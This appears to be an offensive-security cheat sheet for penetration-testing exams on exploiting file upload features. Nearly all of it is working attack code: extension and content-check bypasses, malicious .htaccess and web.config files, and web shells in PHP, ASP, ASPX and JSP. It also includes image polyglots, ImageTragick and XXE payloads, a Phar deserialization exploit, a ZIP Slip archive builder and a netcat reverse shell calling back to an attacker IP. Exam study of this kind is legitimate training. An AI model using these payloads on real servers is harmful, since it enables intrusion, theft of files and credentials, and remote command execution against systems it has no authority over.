# File Upload Attacks Complete

> File upload vulnerability complete reference for CPTS/OSCP exams. Extension bypass, magic bytes, web shells, server-side attacks.

---

## 1. Extension Bypass Techniques

### Direct PHP Extensions

```php
// Try these extensions in order:
.php
.php3
.php4
.php5
.phtml
.phar
.pht
.pgif
.shtml
.inc
.php7
.php8
.pHP     // Case variation
.Php
.PhP
.PHP
.pHp
```

### Extension Bypass Methods

```bash
# Double extension
file.php.jpg
file.jpg.php
file.php;.jpg
file.php%00.jpg     # Null byte (old PHP <5.3.4)
file.php\x00.jpg
file.php%00          # Null byte truncation

# Special characters
file.php.
file.php .
file.php..
file.php.
file.php%20
file.php%0d%0a.jpg
file.php%0a
file.php%0d

# Backslash bypass
file.php\
file.php\.
file.php\..\
```

### .htaccess Attack

```bash
# If server allows .htaccess upload, you can enable PHP in any extension

# Upload this as .htaccess:
AddType application/x-httpd-php .txt

# Then upload shell.txt containing PHP code, execute as PHP

# Alternative .htaccess - Enable all extensions as PHP
AddType application/x-httpd-php .php3 .php4 .php5 .phtml .phar .inc .txt .jpg

# More aggressive .htaccess
AddHandler php-script .txt
AddType application/x-httpd-php .txt
```

### web.config Attack (IIS)

```xml
<!-- Upload this as web.config to enable PHP on IIS -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.php" verb="*" modules="FastCgiModule" scriptProcessor="php-cgi.exe" resourceType="File" />
    </handlers>
  </system.webServer>
</configuration>
```

### Content-Type Manipulation

```bash
# Intercept upload in Burp, modify Content-Type

# Change from:
Content-Type: application/x-php

# To common accepted types:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: text/plain
Content-Type: application/pdf
Content-Type: application/octet-stream
Content-Type: multipart/form-data
```

---

## 2. Magic Bytes & File Signature Bypass

### Add Magic Bytes to Shell Files

```bash
# JPEG magic bytes FF D8 FF E0
echo -e '\xff\xd8\xff\xe0' > shell.jpg.php
echo '<?php system($_GET["c"]); ?>' >> shell.jpg.php

# PNG magic bytes 89 50 4E 47
echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.png.php
echo '<?php system($_GET["c"]); ?>' >> shell.png.php

# GIF magic bytes GIF89a / GIF87a
echo 'GIF89a' > shell.gif.php
echo '<?php system($_GET["c"]); ?>' >> shell.gif.php

# PDF magic bytes %PDF-
echo '%PDF-1.4' > shell.pdf.php
echo '<?php system($_GET["c"]); ?>' >> shell.pdf.php
```

### Validate Magic Bytes

```bash
# Check the file signatures you created
xxd shell.jpg.php | head -3
file shell.jpg.php

# Verify file command recognizes it
file -i shell.jpg.php
```

---

## 3. Null Byte Injection

```bash
# Classic null byte (Unix/PHP <5.3.4)
shell.php%00.jpg
shell.php\x00.jpg

# Double URL encoding of null byte
shell.php%2500.jpg

# Null byte truncation in different positions
shell.php%00.ext
shell.php%00.

# For Perl-based systems
shell.pl%00.jpg
```

---

## 4. Web Shells

### Minimal PHP Web Shell

```php
<!-- upload this as shell.php -->
<?php system($_GET['c']); ?>
```

### More Feature-Rich PHP Shell

```php
<?php
// Multi-function web shell
$cmd = $_GET['c'] ?? $_POST['c'] ?? '';
if ($cmd) {
    echo "<pre>";
    system($cmd);
    echo "</pre>";
} else {
    echo "Usage: ?c=command";
}
?>
```

### PHP One-Liners

```php
<?=`$_GET['c']`?>
<?php exec($_GET['c']);?>
<?php system($_GET['c']);?>
<?php passthru($_GET['c']);?>
<?php shell_exec($_GET['c']);?>
<?php echo shell_exec($_POST['c']);?>
<?php echo `$_POST['c']`;?>
<?php eval($_GET['c']);?>
<?php assert($_GET['c']);?>
<?php preg_replace('/.*/e',$_GET['c'],'');?>
<?php call_user_func($_GET['f'],$_GET['c']);?>
```

### ASP/ASPX Web Shell

```asp
<%
' ASP one-liner
Execute("set o=CreateObject(""WScript.Shell""):Set a=o.Exec(Request(""c"")):Response.Write(a.StdOut.ReadAll())")
%>

<!-- ASPX -->
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["c"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
</script>
```

### JSP Web Shell

```jsp
<%
Runtime.getRuntime().exec(request.getParameter("c"));
%>
```

### Image Shell (Polyglot)

```bash
# Create a valid image that also contains PHP code
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg evil.jpg

# Or create a minimal valid JPEG + PHP
python3 -c "
import struct
# Minimal JPEG header + PHP payload
data = b'\\xff\\xd8\\xff\\xe0'  # JPEG SOI + APP0
data += struct.pack('>H', 16)  # APP0 length
data += b'JFIF\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x01\\x00\\x00'
data += b'<?php system(\$_GET[\"c\"]); ?>'
with open('polyglot.jpg.php', 'wb') as f:
    f.write(data)
"
```

---

## 5. Server-Side Attacks

### ImageTragick (ImageMagick RCE)

```bash
# Check ImageMagick version via error messages or headers

# .mvg file payload (ImageTragick)
push graphic-context
viewbox 0 0 1 1
image over 0,0 1,1 'https://YOUR_IP/shell.txt'
pop graphic-context

# SVG with RCE (ImageMagick)
cat > evil.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="1" height="1" version="1.1"
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink">
  <image width="1" height="1"
    xlink:href="https://YOUR_IP/shell.php%20/tmp/test.txt"/>
</svg>
EOF

# Test for ImageMagick
# Upload any image, if it gets processed -> check for ImageMagick via:
# Error messages containing "ImageMagick" or "convert" or "identify"
```

### XXE via File Upload

```xml
<!-- Upload a file with XML content, if parser is vulnerable -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>

<!-- XXE to SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>
  <data>&xxe;</data>
</root>

<!-- XXE with PHP base64 wrapper -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]>
<root>
  <data>&xxe;</data>
</root>
```

### Phar Deserialization

```php
<?php
// Create a .phar file that triggers deserialization
class Evil {
    public function __destruct() {
        system($_GET['c']);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Evil());
$phar->stopBuffering();
?>
```

### ZIP Slip (Path Traversal via Archive)

```bash
# Craft a zip file with path traversal in filename
# Python script to create malicious zip
python3 << 'EOF'
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.writestr('../../../var/www/html/shell.php',
                '<?php system($_GET["c"]); ?>')
EOF
```

---

## 6. File Upload Exploitation Checklist

```
EXPLOITATION ORDER:

1. TRY BASIC:
   [ ] Upload .php file
   [ ] Try .php3, .php4, .php5, .phtml, .phar
   [ ] Case variation: .PHP, .Php, .pHp

2. BYPASS EXTENSION FILTER:
   [ ] Double extension: file.php.jpg
   [ ] Null byte: file.php%00.jpg
   [ ] Content-Type modification
   [ ] .htattack upload
   [ ] Special chars: file.php., file.php , file.php;.jpg

3. BYPASS CONTENT CHECK:
   [ ] Add magic bytes (GIF89a, JPEG, PNG)
   [ ] Modify Content-Type header
   [ ] Polyglot image+PHP file
   [ ] Exif comment injection

4. FIND WHERE IT'S STORED:
   [ ] Check response for path
   [ ] Fuzz upload directory
   [ ] Check timestamp-based naming
   [ ] Check if filename is stored in DB, rendered elsewhere

5. EXECUTE:
   [ ] Access uploaded file directly
   [ ] Include it via LFI if direct access blocked
   [ ] Race condition if temporary file
```

---

## 7. Bypass Decision Tree

```
File upload blocked!
    |
    v
Extension blacklist?
    | YES -> Try alternate extensions (.php3, .phtml, .phar, .shtml)
    |      -> Try case variation
    |      -> Try double extension
    | NO  -> v
             |
Content-Type check?
    | YES -> Modify Content-Type header
    | NO  -> v
             |
Magic byte check?
    | YES -> Prep exact magic bytes to shell file
    | NO  -> v
             |
Image resize/processing?
    | YES -> Polyglot image (exiftool comment injection)
    | NO  -> v
             |
Only specific extensions allowed
    | YES -> .htaccess upload to AddType custom extension as PHP
    |      -> Upload web.config on IIS
    | NO  -> Simple PHP upload should work!
```

---

## 8. Reverse Shell via File Upload

```bash
# Upload a reverse shell file

# PHP reverse shell (save as rev.php)
echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f");?>' > rev.php

# Then execute: navigate to /uploads/rev.php or
# if direct access blocked, include via LFI:
# http://target.com/page.php?file=uploads/rev.php
```

---

## Related Topics

- [[../../3.1 Recon and Discovery/ffuf Mastery]] - Fuzz upload directories
- [[../../3.1 Recon and Discovery/Web Recon Methodology]] - Find upload endpoints
- [[../3.2 SQL Injection/SQL Injection Complete]] - INTO OUTFILE for shell creation
- [[../3.4 LFI RFI/LFI RFI Path Traversal Complete]] - Include uploaded shell via LFI
- [[../3.6 Command Injection/Command Injection Complete]] - Shell execution
